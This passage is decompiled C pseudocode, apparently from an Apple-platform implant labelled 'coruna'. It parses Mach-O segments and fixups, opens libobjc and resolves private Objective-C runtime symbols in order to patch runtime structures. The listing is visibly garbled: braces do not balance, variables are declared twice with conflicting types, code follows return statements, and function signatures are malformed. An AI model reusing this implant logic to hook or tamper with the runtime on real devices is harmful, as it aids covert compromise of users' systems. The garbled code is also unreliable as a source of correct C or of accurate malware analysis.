        buf = (uint *)((long)entry + (unsigned long)entry[1]);
        type_id = *buf;
        if (type_id == 0) {
          type_id_8 = 0;
        }
        else {
          scratch = 0;
          block = (uint *)((long)entry + (unsigned long)size);
          do {
            if (buf[scratch + 1] != 0) {
              type_id_8 = 0x920006;
              if ((block < entry) ||
                 (str = (uint *)((long)buf + (unsigned long)buf[scratch + 1]),
                 (((str < entry || block <= str) || (uint *)0xffffffffffffffe7 < str)
                 || str + 6 < entry) || block < str + 6)) break;
              copy = (uint *)((unsigned long)*str + (long)str);
              if ((copy < str || copy < entry) || block < copy) {
check_ok:
                type_id_8 = 0x920006;
                break;
              }
              port = 0;
              while (port < (ushort)str[5]) {
                copy = (uint *)((long)str + port * 2 + 0x16);
                data = (uint *)((unsigned long)*str + (long)str);
                if (((((data < str || copy < str) || data <= copy) ||
                     (uint *)0xfffffffffffffffc < copy) &&
                     (((data < str || copy < str) || data <= copy) ||
                     copy != (uint *)0xfffffffffffffffd) || (uint *)((long)copy + 2U) < str)
                    type_id_8 = 0x920006;
                    break;
                ls13 = (short)*copy;
                if (ls13 == -1) {
                  type_id_8 = 0;
                }
                else if (ls13 < 0) {
                  obj = (uint *)((long)str + ((long)ls13 & 0x7fffU) * 2 + 0x16);
                  copy = (uint *)((long)obj + 2);
                  if ((((obj < str || data <= obj) || (uint *)0xfffffffffffffffd < obj
                       type_id_8 = 0x920006;
                       break;
                  while( true ) {
                    size = *obj;
                    type_id_8 = coruna_return_zero_e288(handle,data,(uint)type_id_9 & 0xffff,str,port,
                                          (ushort)size & 0x7fff);
                    if (((int)type_id_8 != 0) || ((short)(ushort)size < 0)) break;
                    data = (uint *)((unsigned long)*str + (long)str);
                    type_id_8 = 0x920006;
                    break;
                  }
                }
                else {
                  type_id_8 = coruna_return_zero_e288(handle,data,(uint)type_id_9 & 0xffff,str,port,ls13);
                }
                port = port + 1;
                if ((int)type_id_8 != 0) goto skip;
              }
              type_id = *buf;
            }
            type_id_8 = 0;
            scratch = scratch + 1;
          } while (scratch < type_id);
        }
      }
skip:
      if (data == (void *)0x0) {
        return type_id_8;
      }
      if ((type_id_9 & 0xffff) == 0) {
        return type_id_8;
      }
      type_id_9 = type_id_9 & 0xffff;
      u = type_id_8;
    }
    else {
      if (((bootargs[2] < 0x1c) || (size <= bootargs[2])) ||
         ((bootargs[3] < 0x1c || (size <= bootargs[3])))) goto next;
      if (bootargs[6] != 0) {
        return 0x920003;
      }
      if (type_id >> 0x10 != 0) {
        return 0xad001;
      }
      data = _calloc(type_id_9,8);
      if (data == (void *)0x0) {
        return 0xad009;
      }
      type_id_10 = 0;
      size = entry[3];
      block = data;
      port = 1;
      do {
        type_id = entry[5];
        if (type_id == 3) {
          ptr = (unsigned long *)((long)entry + type_id_10 + entry[2]);
          kind = *ptr;
          tag = ptr[1];
          type_id = (uint)kind & 0xffff;
          version = (int)(short)kind;
          if (type_id < 0xfff1) {
            version = type_id;
          }
          handle = (long)entry + (kind >> 0x20) + (unsigned long)size;
          kind = kind >> 0x10 & 1;
          err = 0x10;
        }
        else if (type_id == 2) {
          buf = (uint *)((long)entry + type_id_10 + entry[2]);
          type_id = *buf;
          tag = (unsigned long)(int)buf[1];
          version = (int)(char)type_id;
          if ((type_id & 0xff) < 0xf1) {
            version = type_id & 0xff;
          }
          handle = (long)entry + (unsigned long)(type_id >> 9) + (unsigned long)size;
          kind = (unsigned long)(type_id >> 8 & 1);
          err = 8;
        }
        else {
          if (type_id != 1) {
            u = 0x920004;
            _bzero(data,type_id_9 << 3);
            _free(data);
            return u;
          }
          tag = 0;
          type_id = *(uint *)((long)entry + type_id_10 + entry[2]);
          version = (int)(char)type_id;
          if ((type_id & 0xff) < 0xf1) {
            version = type_id & 0xff;
          }
          handle = (long)entry + (unsigned long)(type_id >> 9) + (unsigned long)size;
          kind = (unsigned long)(type_id >> 8 & 1);
          err = 4;
        }
        u = coruna_objc_empty_vtable_107b4(handle,version,handle,tag,kind,block);
        if ((int)u != 0) {
          _bzero(data,type_id_9 << 3);
          _free(data);
          return u;
        }
        u = coruna_implant65fc_via_return_zero_6098(handle,block);
        if ((int)u != 0) break;
        type_id_10 = (unsigned long)(uint)(err + (int)type_id_10);
        block = (void *)((long)block + 8);
        status = port < type_id_9;
        port = port + 1;
      } while (status);
      if ((int)u == 0) {
        size = *(uint *)(*(long *)(handle + 0x198) + 0xc);
        entry = bootargs;
        goto joined_r0x0000d87c;
      }
    }
retry:
    _bzero(data,type_id_9 << 3);
    _free(data);
  }
  else {
next:
    u = 0x920003;
  }
  return u;
}





uint64_t coruna_implant65fc_residual_108(long handle,long addr_2)
{
  uint64_t u;
  
  if (((handle != 0) && (addr_2 != 0)) && (*(long *)(addr_2 + 8) != 0)) {
    u = coruna_implant65fc_via_strdup_4();
    return u;
  }
  return 0xad001;
}





uint64_t coruna_implant65fc_via_objc_empty_vtable_107b4_2(long handle,uint64_t *val)
{
  int *err;
  int *status;
  char err;
  uint64_t u;
  int *flags;
  int *count;
  uint64_t scratch;
  
  u = 0xad001;
  scratch = 0;
  if ((((handle != 0) && (val != (uint64_t *)0x0)) && (val[1] != 0)) &&
     (u = coruna_objc_empty_vtable_107b4(handle,*(uint32_t *)((long)val + 0x24),val[1],val[3],
                           *(byte *)(val + 2) & 1,&scratch), (int)u == 0)) {
    count = (int *)*val;
    status = *(int **)(handle + 0x40);
    err = (int *)(*(long *)(handle + 0x48) + (long)status);
    if (((((*(ushort *)(handle + 0x1c0) >> 7 & 1) == 0) ||
         (flags = (int *)val[5], flags == (int *)0x0)) ||
        ((*(uint *)(val + 6) == 0 ||
         ((flags + (unsigned long)*(uint *)(val + 6) * 2 < flags || (count < flags)))))) ||
       (flags + (unsigned long)*(uint *)(val + 6) * 2 <= count)) {
      if ((err < status || count < status) || err <= count) {
        return 0x910007;
      }
    }
    else {
      u = coruna_implant65fc_via_return_zero_6098(handle,&scratch);
      if ((int)u != 0) {
        return u;
      }
    }
    err = *(char *)(val + 4);
    if (err == '\x03') {
      u = 0;
      *count = ((int)scratch - (int)count) + -4;
    }
    else if (err == '\x02') {
      u = 0;
      *count = (int)scratch;
    }
    else if (err == '\x01') {
      u = 0;
      *(uint64_t *)count = scratch;
    }
    else {
      u = 0x91000e;
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_bzero_5(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 0x188), handle != 0 && addr_2 != 0)) {
    if (*(int *)(handle + 0x14) == 0) {
      u = 0;
    }
    else {
      scratch = 0;
      u = coruna_block_dispose_fcd0(handle,*(uint32_t *)(handle + 0x10),&scratch);
      if ((int)u == 0) {
        u = coruna_bzero_5(handle,0,scratch,
                             scratch + (unsigned long)*(uint *)(*(long *)(handle + 0x188) + 0x14),addr_2,
                             val);
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_bzero_5_2(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  long handle;
  long scratch;
  
  u = 0xad001;
  if ((handle != 0) && (handle = *(long *)(handle + 0x188), handle != 0 && addr_2 != 0)) {
    if (*(int *)(handle + 0x24) == 0) {
      u = 0;
    }
    else {
      scratch = 0;
      u = coruna_block_dispose_fcd0(handle,*(uint32_t *)(handle + 0x20),&scratch);
      if ((int)u == 0) {
        u = coruna_bzero_5(handle,1,scratch,
                             scratch + (unsigned long)*(uint *)(*(long *)(handle + 0x188) + 0x24),addr_2,
                             val);
      }
    }
  }
  return u;
}





uint64_t coruna_implant65fc_via_implant65fc_via_bzero_5_2(long handle,long addr_2,uint64_t val)
{
  uint64_t u;
  
  u = 0xad001;
  if ((handle != 0) && (addr_2 != 0)) {
    if (*(long *)(handle + 0x188) == 0) {
      u = 0;
    }
    else {
      u = coruna_implant65fc_via_bzero_5(handle,addr_2);
      if ((int)u == 0) {
        u = coruna_implant65fc_via_bzero_5_2(handle,addr_2,val);
        return u;
      }
    }
  }
  return u;
}





unsigned long coruna_bzero_5(long arg,byte val,byte *n,byte *m,void (*p,
                  uint64_t q)

{
  bool flags;
  uint size;
  byte count;
  long base;
  uint32_t port;
  byte *copy;
  byte *data;
  unsigned long type_id_13;
  unsigned long type_id;
  byte *obj;
  unsigned long type_id_14;
  unsigned long type_id_15;
  byte idx;
  long url_buf;
  byte *json_buf;
  uint64_t cache_45;
  unsigned long block_ctx;
  uint64_t bootargs;
  void *thread_attr;
  unsigned long host_info;
  
  type_id_14 = 0xad001;
  if ((((arg != 0) && (n != (byte *)0x0)) && (m != (byte *)0x0)) &&
     ((n <= m && (p != (void (*)0x0)))) {
    block_ctx = 0;
    cache_45 = 0;
    thread_attr = (void *)0x0;
    json_buf = (byte *)0x0;
    url_buf = 0;
    bootargs = 1;
    host_info = (unsigned long)val << 0x20;
    if (n < m) {
      base = 0;
      idx = 0;
      do {
        obj = n + 1;
        count = *n;
        if (0xc < count >> 4) {
          type_id_14 = 0x91000d;
          if (thread_attr == (void *)0x0) {
          return type_id_14;
          }
          _bzero(thread_attr,(host_info & 0xffffffff) << 3);
          _free(thread_attr);
          return type_id_14;
        }
        type_id_15 = (unsigned long)count & 0xf;
        n = obj;
        switch(count >> 4) {
        case 0:
          type_id_14 = 0;
          idx = val ^ 1 | idx;
          break;
        case 1:
          type_id_14 = 0;
          bootargs = coruna_u64_pack(((int)type_id_15), ((uint32_t))bootargs);
          break;
        case 2:
          type_id_14 = 0;
          type_id_15 = 0;
          copy = obj;
          do {
            if (m <= copy) {
              port = 0;
              n = obj;
              break;
            }
            n = copy + 1;
            count = *copy;
            type_id_13 = ((unsigned long)count & 0x7f) << (type_id_15 & 0x3f);
            if (0x3f < (uint)type_id_15) {
              type_id_13 = 0;
            }
            type_id_14 = type_id_13 | type_id_14;
            port = (uint32_t)type_id_14;
            type_id_15 = (unsigned long)((uint)type_id_15 + 7);
            copy = n;
          } while ((char)count < '\0');
          bootargs = coruna_u64_pack((port), ((uint32_t))bootargs);
          type_id_14 = 0;
          break;
        case 3:
          type_id_14 = 0;
          if ((int)type_id_15 == 0) {
            bootargs = bootargs & 0xffffffff;
          }
          else {
            bootargs = coruna_u64_pack(((int)(char)count), ((uint32_t))bootargs) | 0xfffffff000000000;
          }
          break;
        case 4:
          copy = obj;
          do {
            if (copy == m) {
              n = obj;
              obj = (byte *)0x0;
              break;
            }
            n = copy + 1;
            count = *copy;
            copy = n;
          } while (count != 0);
          cache_45 = coruna_u64_pack71((cache_45), ((char))type_id_15);
          size = 0x91000c;
          if (obj != (byte *)0x0) {
            size = 0;
          }
          type_id_14 = (unsigned long)size;
          json_buf = obj;
          break;
        case 5:
          type_id_14 = 0;
          bootargs = coruna_u64_pack71((bootargs), ((char))type_id_15);
          break;
        case 6:
          block_ctx = 0;
          type_id_14 = 0;
          copy = obj;
          do {
            if (m <= copy) {
              block_ctx = 0;
              n = obj;
              type_id_14 = 0;
              break;
            }
            n = copy + 1;
            count = *copy;
            type_id_15 = ((unsigned long)count & 0x7f) << (type_id_14 & 0x3f);
            if (0x3f < (uint)type_id_14) {
              type_id_15 = 0;
            }
            block_ctx = type_id_15 | block_ctx;
            type_id_14 = (unsigned long)((uint)type_id_14 + 7);
            copy = n;
          } while ((char)count < '\0');
          if ((count & 0x40) != 0) {
            block_ctx = 0xffffffffffffffff;
          }
load_ok_32:
          type_id_14 = 0;
          break;
        case 7:
          base = coruna_macho_seg19_offset(arg,type_id_15,1);
          if (base != 0) {
            type_id_14 = 0;
            type_id_15 = 0;
            copy = obj;
            do {
              if (m <= copy) {
                type_id_14 = 0;
                n = obj;
                break;
              }
              n = copy + 1;
              count = *copy;
              type_id_13 = ((unsigned long)count & 0x7f) << (type_id_15 & 0x3f);
              if (0x3f < (uint)type_id_15) {
                type_id_13 = 0;
              }
              type_id_14 = type_id_13 | type_id_14;
              type_id_15 = (unsigned long)((uint)type_id_15 + 7);
              copy = n;
            } while ((char)count < '\0');
            base = type_id_14 + base;
            type_id_14 = 0;
            url_buf = base;
            break;
          }
          type_id_14 = 0x910009;
load_ok_30:
          if (thread_attr == (void *)0x0) {
            return type_id_14;
          }
          _bzero(thread_attr,(host_info & 0xffffffff) << 3);
          _free(thread_attr);
          return type_id_14;
        case 8:
          type_id_14 = 0;
          type_id_15 = 0;
          copy = obj;
          do {
            if (m <= copy) {
              type_id_14 = 0;
              n = obj;
              break;
            }
            n = copy + 1;
            count = *copy;
            type_id_13 = ((unsigned long)count & 0x7f) << (type_id_15 & 0x3f);
            if (0x3f < (uint)type_id_15) {
              type_id_13 = 0;
            }
            type_id_14 = type_id_13 | type_id_14;
            type_id_15 = (unsigned long)((uint)type_id_15 + 7);
            copy = n;
          } while ((char)count < '\0');
          base = base + type_id_14;
          url_buf = base;
load_ok_31:
          type_id_14 = 0;
          break;
        case 9:
          type_id_14 = (*p)(arg,&url_buf,q);
          base = url_buf + 8;
          url_buf = base;
          break;
        case 10:
          type_id_14 = (*p)(arg,&url_buf,q);
          if (thread_attr == (void *)0x0) {
          return type_id_14;
          }
          _bzero(thread_attr,(host_info & 0xffffffff) << 3);
          _free(thread_attr);
          return type_id_14;
          type_id_14 = 0;
          type_id_15 = 0;
          copy = obj;
          do {
            if (m <= copy) {
              type_id_14 = 0;
              n = obj;
              break;
            }
            n = copy + 1;
            count = *copy;
            type_id_13 = ((unsigned long)count & 0x7f) << (type_id_15 & 0x3f);
            if (0x3f < (uint)type_id_15) {
              type_id_13 = 0;
            }
            type_id_14 = type_id_13 | type_id_14;
            type_id_15 = (unsigned long)((uint)type_id_15 + 7);
            copy = n;
          } while ((char)count < '\0');
          base = type_id_14 + url_buf + 8;
load_ok_33:
          type_id_14 = 0;
          url_buf = base;
          break;
        case 0xb:
          type_id_14 = (*p)(arg,&url_buf,q);
          url_buf = url_buf + type_id_15 * 8;
load_ok_34:
          base = url_buf + 8;
          url_buf = base;
          break;
        case 0xc:
          type_id_15 = 0;
          type_id_14 = 0;
          copy = obj;
          do {
            if (m <= copy) {
              type_id_15 = 0;
              data = obj;
              break;
            }
            data = copy + 1;
            count = *copy;
            type_id_13 = ((unsigned long)count & 0x7f) << (type_id_14 & 0x3f);
            if (0x3f < (uint)type_id_14) {
              type_id_13 = 0;
            }
            type_id_15 = type_id_13 | type_id_15;
            type_id_14 = (unsigned long)((uint)type_id_14 + 7);
            copy = data;
          } while ((char)count < '\0');
          type_id_13 = 0;
          type_id_14 = 0;
          obj = data;
          do {
            if (m <= obj) {
              type_id_13 = 0;
              n = data;
              break;
            }
            n = obj + 1;
            count = *obj;
            type_id = ((unsigned long)count & 0x7f) << (type_id_14 & 0x3f);
            if (0x3f < (uint)type_id_14) {
              type_id = 0;
            }
            type_id_13 = type_id | type_id_13;
            type_id_14 = (unsigned long)((uint)type_id_14 + 7);
            obj = n;
          } while ((char)count < '\0');
          if (0xfffffffe < type_id_15) {
            type_id_14 = 0x91000f;
            if (thread_attr == (void *)0x0) {
            return type_id_14;
            }
            _bzero(thread_attr,(host_info & 0xffffffff) << 3);
            _free(thread_attr);
            return type_id_14;
          }
          if (type_id_15 == 0) {
            type_id_14 = 0;
          }
          else {
            type_id = 1;
            do {
              type_id_14 = (*p)(arg,&url_buf,q);
              base = type_id_13 + 8 + url_buf;
              url_buf = base;
              if ((int)type_id_14 != 0) break;
              flags = type_id < type_id_15;
              type_id = (unsigned long)((int)type_id + 1);
            } while (flags);
          }
        }
        if (thread_attr == (void *)0x0) {
        return type_id_14;
        }
        _bzero(thread_attr,(host_info & 0xffffffff) << 3);
        _free(thread_attr);
        return type_id_14;
      } while( true );
    }
    type_id_14 = 0;
  }
  return type_id_14;
}





uint64_t
void coruna_return_zero_e288(long handle,long addr_2,uint size,long off_3,int flags,uint flags_2)
{
  unsigned long *ptr;
  unsigned long *buf;
  ushort u;
  bool err;
  uint64_t size;
  uint64_t version;
  unsigned long port;
  unsigned long tag;
  long handle;
  unsigned long *scratch [2];
  
  size = 0xad001;
  if ((handle != 0) && (off_3 != 0)) {
    scratch[0] = (unsigned long *)0x0;
    size = coruna_block_dispose_fcd0(handle,*(long *)(off_3 + 8) + (unsigned long)flags_2 +
                                 (unsigned long)((uint)*(ushort *)(off_3 + 4) * flags),scratch);
    if ((int)size == 0) {
      version = 0x920006;
      u = *(ushort *)(off_3 + 6);
      if ((u | 4) == 6) {
        size = 0xad001;
        if (scratch[0] != (unsigned long *)0x0) {
          buf = *(unsigned long **)(handle + 8);
          ptr = (unsigned long *)(*(long *)(handle + 0x10) + (long)buf);
          size = version;
          if ((((buf <= ptr) && (buf <= scratch[0])) && (scratch[0] < ptr)) &&
             (((scratch[0] < (unsigned long *)0xfffffffffffffff8 && (buf <= scratch[0] + 1)) &&
              (scratch[0] + 1 <= ptr)))) {
            do {
              port = *scratch[0];
              if ((long)port < 0) {
                if (size <= (uint)(port & 0xffffff)) {
                  return 0x920001;
                }
                tag = *(long *)(addr_2 + (port & 0xffffff) * 8) + (port >> 0x18 & 0xff);
              }
              else {
                if (u == 2) {
                  handle = *(long *)(handle + 0x50);
                }
                else {
                  handle = *(long *)(handle + 0x40);
                }
                tag = handle + (port & 0xfffffffff | (port >> 0x24) << 0x38);
              }
              *scratch[0] = tag;
              if ((port >> 0x33 & 0xfff) == 0) {
                return 0;
              }
              buf = *(unsigned long **)(handle + 8);
              ptr = (unsigned long *)(*(long *)(handle + 0x10) + (long)buf);
              if (ptr < buf) {
                return 0x920006;
              }
              scratch[0] = (unsigned long *)((long)scratch[0] +
                                     (unsigned long)(((uint)(port >> 0x33) & 0xfff) << 2));
              err = scratch[0] < buf;
            } while (((((!err && scratch[0] <= ptr) && (err || ptr != scratch[0])) &&
                       scratch[0] < (unsigned long *)0xfffffffffffffff7 ||
                      ((!err && scratch[0] <= ptr) && (err || ptr != scratch[0])) &&
                      scratch[0] == (unsigned long *)0xfffffffffffffff7) && buf <= scratch[0] + 1) &&
                     scratch[0] + 1 <= ptr);
          }
        }
      }
      else {
        size = 0x920005;
      }
    }
  }
  return size;
}





uint64_t coruna_implant65fc_via_macho_text_seg(long handle,long addr_2,int flags)
{
  uint64_t u;
  long handle;
  uint64_t size;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t scratch;
  
  u = 0xad001;
  if ((((handle != 0) && (handle = *(long *)(handle + 0x38), handle != 0)) &&
      (*(long *)(handle + 0x40) != 0)) && ((*(long *)(handle + 0x48) != 0 && (addr_2 != 0)))) {
    if ((flags == 0x3c) || (flags == 0x28)) {
      size = *(uint64_t *)(addr_2 + 8);
      bootargs = 0;
      scratch = 0;
      scratch = size;
      if (((*(int *)(handle + 0x50) != 2) || (flags != 0x28)) ||
         (u = coruna_implant65fc_via_identity_6080_2(handle,handle,handle + 0x58), (int)u == 0)) {
        if (flags == 0x28) {
          (**(void (**)(handle + 0x40))(1,&bootargs,&scratch);
          if (*(int *)(handle + 0x50) == 1) {
            coruna_macho_text_seg(handle);
          }
        }
        else {
          (**(void (**)(handle + 0x48))(0,size);
        }
        u = 0;
      }
    }
    else {
      u = 0x1800b;
    }
  }
  return u;
}





uint32_t coruna_macho_text_seg(long handle)
{
  int err;
  byte err;
  int status;
  uint32_t u;
  long handle;
  long addr;
  int *err;
  unsigned long size;
  int flags;
  int *status;
  
  if (handle == 0) {
    u = 0xad001;
  }
  else {
    err = *(int *)(handle + 0x10);
    u = 0x18006;
    if (err != 0) {
      err = 0;
      flags = 0;
      handle = 0;
      addr = 0;
      status = (int *)(handle + 0x20);
      do {
        if (*status == 0x19) {
          status = _strcmp((char *)(status + 2),"__TEXT");
          if (status == 0) {
            handle = handle - *(long *)(status + 6);
            err = 1;
          }
          else {
            status = _strcmp((char *)(status + 2),"__DATA_DIRTY");
            if ((status == 0) && (size = (unsigned long)(uint)status[0x10], status[0x10] != 0)) {
              err = status + 0x12;
              do {
                status = _strcmp((char *)err,"__common");
                if (status == 0) {
                  addr = handle + *(long *)(err + 8);
                }
                err = err + 0x14;
                size = size - 1;
              } while (size != 0);
            }
          }
        }
        status = (int *)((long)status + (unsigned long)(uint)status[1]);
        flags = flags + 1;
      } while (flags != err);
      u = 0x1800c;
      if (!(bool)(err & addr != 0)) {
        u = 0x18006;
      }
    }
  }
  return u;
}
static uint64_t coruna_implant_libobjc_close(long handle, uint64_t rc, unsigned long host5)
{
  coruna_ctx_free_11dc8(host5);
  _dlclose(handle);
  return rc;
}

static uint64_t coruna_implant_libobjc_commit(long handle, uint port, unsigned long kind,
    unsigned long bootargs, unsigned long scratch, unsigned long host5)
{
  if (port < 0xf0000) {
    uint64_t rc = coruna_macho_text_seg(kind);
    if ((int)rc == 0x1800c) {
      *(uint32_t *)(handle + 0x50) = 2;
      rc = coruna_pthread_mutex_init(handle, handle + 0x58);
    }
    return coruna_implant_libobjc_close(handle, rc, host5);
  }
  *(uint32_t *)(handle + 0x50) = 0;
  *(long *)(handle + 0x28) = handle;
  *(uint *)(handle + 0x30) = port;
  *(unsigned long *)(handle + 0x38) = kind;
  *(unsigned long *)(handle + 0x40) = bootargs;
  *(unsigned long *)(handle + 0x48) = scratch;
  return 0;
}

static uint64_t coruna_implant_libobjc_bind_after_flush(long handle, uint port, unsigned long kind,
    unsigned long tag, long addr, unsigned long scratch, unsigned long host5)
{
  uint32_t type_id_11;
  uint64_t type_id_9;
  unsigned long bootargs;
  unsigned long *serial_buf;

  if (port >> 0x14 == 0) {
    type_id_11 = 5;
    if (0x3c0 < port >> 10) {
      type_id_11 = 6;
    }
    if (port < 0xf0000) {
      if (port < 0xe0000) {
        type_id_11 = 8;
        if (port >> 9 < 0x681) {
          type_id_11 = 4;
        }
      }
      else {
        type_id_11 = 0xc;
      }
    }
  }
  else {
    type_id_11 = 8;
  }
  type_id_9 = coruna_implant65fc_residual_111(host5, "__objc_flush_caches", &serial_buf);
  if ((int)type_id_9 != 0) {
    return coruna_implant_libobjc_close(handle, type_id_9, host5);
  }
  type_id_9 = coruna_dladdr(serial_buf, type_id_11, tag, addr, &bootargs);
  coruna_ctx_free_11dc8(host5);
  if ((int)type_id_9 == 0) {
    return coruna_implant_libobjc_commit(handle, port, kind, bootargs, scratch, host5);
  }
  return coruna_implant_libobjc_close(handle, type_id_9, host5);
}

static int coruna_implant_libobjc_port_rebind(uint port)
{
  if ((int)port < 0xf0800) {
    return 1;
  }
  if (0x1002ff < (int)port) {
    return 1;
  }
  if (0x1000ff < (int)port) {
    return 1;
  }
  if ((port == 0xf0800) || (port == 0x100000)) {
    return 1;
  }
  return 0;
}

uint64_t coruna_load_libobjc_path(long handle)
{
  unsigned long u;
  unsigned long size;
  uint32_t version;
  char *ptr;
  uint port;
  unsigned long tag;
  unsigned long kind;
  bool err;
  bool status;
  bool flags;
  int err;
  long handle;
  long addr;
  unsigned long type_id;
  unsigned long type_id_8;
  uint64_t type_id_9;
  uint type_id_10;
  uint32_t type_id_11;
  int *err;
  unsigned long *ptr;
  long off;
  unsigned long *buf;
  unsigned long type_id_12;
  unsigned long type_id_13;
  uint64_t type_id_14;
  unsigned long scratch;
  unsigned long bootargs;
  long thread_attr;
  unsigned long host_info [6];
  unsigned long *serial_buf;
  
  if (handle == 0) {
    return 0xad001;
  }
  type_id_14 = 0x18008;
  handle = _dlopen("/usr/lib/libobjc.A.dylib",2);
  if (handle == 0) {
    return 0x18004;
  }
  host_info[2] = 0;
  host_info[1] = 0;
  host_info[4] = 0;
  host_info[3] = 0;
  addr = _dlsym(handle,"object_getClass");
  type_id = _dlsym(handle,"_objc_patch_root_of_class");
  type_id_8 = _dlsym(handle,"_objc_map_images");
  if (addr == 0) {
    type_id_9 = 0x18002;
  }
  else {
    err = _dladdr(addr,host_info + 1);
    kind = host_info[2];
    type_id_9 = 0x18003;
    if ((err != 0) && (host_info[2] != 0)) {
      thread_attr = 0;
      host_info[0] = 0;
      type_id_9 = coruna_macho_text_seg_f2d8("__TEXT","__text",host_info[2],host_info,&thread_attr);
      tag = host_info[0];
      addr = thread_attr;
      if ((int)type_id_9 == 0) {
        err = *(int *)(kind + 0x10);
        if (err != 0) {
          err = (int *)(kind + 0x20);
          do {
            if (*err == 0x25) {
              off = 8;
fail:
              port = *(uint *)((long)err + off);
              scratch = 0;
              bootargs = 0;
              status = host_info[0] == 0;
              flags = thread_attr == 0;
              type_id_12 = bootargs;
              bootargs = type_id_12;
              host_info[5] = 0;
              type_id_9 = 0xad001;
              if ((status || flags) ||
              (type_id_9 = coruna_implant65fc_via_ctx_free_11dc8(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
              _dlclose(handle);
              return type_id_9;
              host_info[5] = 0;
              serial_buf = (unsigned long *)0x0;
              err = coruna_macho_text_seg_f2d8("__AUTH_CONST","__const",kind,&serial_buf,host_info + 5);
              if (err == 0x18006) {
                err = coruna_macho_text_seg_f2d8("__DATA_CONST","__const",kind,&serial_buf,host_info + 5);
              }
              type_id_12 = bootargs;
              if ((((err != 0) || (serial_buf == (unsigned long *)0x0)) || (host_info[5] < 0x19)) ||
                 bootargs = type_id_12;
                 host_info[5] = 0;
                 type_id_9 = 0xad001;
                 if ((status || flags) ||
                 (type_id_9 = coruna_implant65fc_via_ctx_free_11dc8(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
                 _dlclose(handle);
                 return type_id_9;
              size = tag + addr;
              buf = serial_buf + 3;
              ptr = serial_buf;
              do {
              if ((*buf == type_id) && (-1 < addr)) {
              type_id_12 = *ptr;
              type_id_13 = ptr[2];
              u = type_id_12 + 8;
              err = type_id_12 < tag;
              if (((((((((!err && type_id_12 <= size) && (err || size != type_id_12)) && tag <= u) &&
              u <= size) && tag <= type_id_13) && type_id_13 <= size) &&
              (((((err || (type_id_12 > size || size == type_id_12)) || tag > u) || size < u) ||
              tag > type_id_13) || size != type_id_13)) && tag <= type_id_13 + 8) && type_id_13 + 8 <= size) {
              scratch = type_id_13;
              bootargs = type_id_8;
              if (type_id_8 != 0) {
              return coruna_implant_libobjc_commit(handle, port, kind, bootargs, scratch, host_info[5]);
              }
              break;
              }
              }
              buf = buf + 1;
              ptr = ptr + 1;
              type_id_12 = bootargs;
              } while (buf <= (unsigned long *)((long)serial_buf + (host_info[5] - 8)));
              bootargs = type_id_12;
              host_info[5] = 0;
              type_id_9 = 0xad001;
              if ((status || flags) ||
              (type_id_9 = coruna_implant65fc_via_ctx_free_11dc8(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
              _dlclose(handle);
              return type_id_9;
            }
            if (*err == 0x32) {
              off = 0xc;
              port = *(uint *)((long)err + off);
              scratch = 0;
              bootargs = 0;
              status = host_info[0] == 0;
              flags = thread_attr == 0;
              type_id_12 = bootargs;
              bootargs = type_id_12;
              host_info[5] = 0;
              type_id_9 = 0xad001;
              if ((status || flags) ||
              (type_id_9 = coruna_implant65fc_via_ctx_free_11dc8(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
              _dlclose(handle);
              return type_id_9;
            }
            err = (int *)((long)err + (unsigned long)(uint)err[1]);
            err = err + -1;
          } while (err != 0);
        }
        type_id_9 = 0x18009;
      }
    }
  }
  _dlclose(handle);
  return type_id_9;
cleanup:
  do {
    if ((*buf == type_id) && (-1 < addr)) {
      type_id_12 = *ptr;
      type_id_13 = ptr[2];
      u = type_id_12 + 8;
      err = type_id_12 < tag;
      if (((((((((!err && type_id_12 <= size) && (err || size != type_id_12)) && tag <= u) &&
              u <= size) && tag <= type_id_13) && type_id_13 <= size) &&
           (((((err || (type_id_12 > size || size == type_id_12)) || tag > u) || size < u) ||
            tag > type_id_13) || size != type_id_13)) && tag <= type_id_13 + 8) && type_id_13 + 8 <= size) {
        scratch = type_id_13;
        bootargs = type_id_8;
        if (type_id_8 != 0) {
          return coruna_implant_libobjc_commit(handle, port, kind, bootargs, scratch, host_info[5]);
        }
        break;
      }
    }
    buf = buf + 1;
    ptr = ptr + 1;
    type_id_12 = bootargs;
  } while (buf <= (unsigned long *)((long)serial_buf + (host_info[5] - 8)));
done:
  bootargs = type_id_12;
  host_info[5] = 0;
  type_id_9 = 0xad001;
  if ((status || flags) ||
     (type_id_9 = coruna_implant65fc_via_ctx_free_11dc8(handle,kind,0,0x10,host_info + 5), (int)type_id_9 != 0))
  _dlclose(handle);
  return type_id_9;
  serial_buf = (unsigned long *)0x0;
  if ((int)port < 0xf0000) {
    if ((int)port < 0xe0000) {
      if ((int)port < 0xd0400) {
        if ((int)port < 0xd0200) {
          if (port != 0xd0000) {
            type_id_10 = 0x100 | 0xd0000;
            if (port != type_id_10) return coruna_implant_libobjc_close(handle, 0x18008, host_info[5]);
          }
        }
        else if (port != 0xd0200) {
          type_id_10 = 0x300 | 0xd0000;
          if (port != type_id_10) return coruna_implant_libobjc_close(handle, 0x18008, host_info[5]);
        }
      }
      else if ((int)port < 0xd0600) {
        if (port != 0xd0400) {
          type_id_10 = 0x500 | 0xd0000;
          if (port != type_id_10) return coruna_implant_libobjc_close(handle, 0x18008, host_info[5]);
        }
      }
      else if (port != 0xd0600) {
        type_id_10 = 0x700 | 0xd0000;
        if (port != type_id_10) return coruna_implant_libobjc_close(handle, 0x18008, host_info[5]);
      }
    }
    else if ((int)port < 0xe0400) {
      if ((int)port < 0xe0200) {
        if (port != 0xe0000) {
          type_id_10 = 0x100 | 0xe0000;
          if (port != type_id_10) return coruna_implant_libobjc_close(handle, 0x18008, host_info[5]);
        }
      }
      else if (port != 0xe0200) {
        type_id_10 = 0x300 | 0xe0000;
        if (port != type_id_10) return coruna_implant_libobjc_close(handle, 0x18008, host_info[5]);
      }
    }
    else if ((int)port < 0xe0600) {
      if (port != 0xe0400) {
        type_id_10 = 0x500 | 0xe0000;
        if (port != type_id_10) return coruna_implant_libobjc_close(handle, 0x18008, host_info[5]);
      }
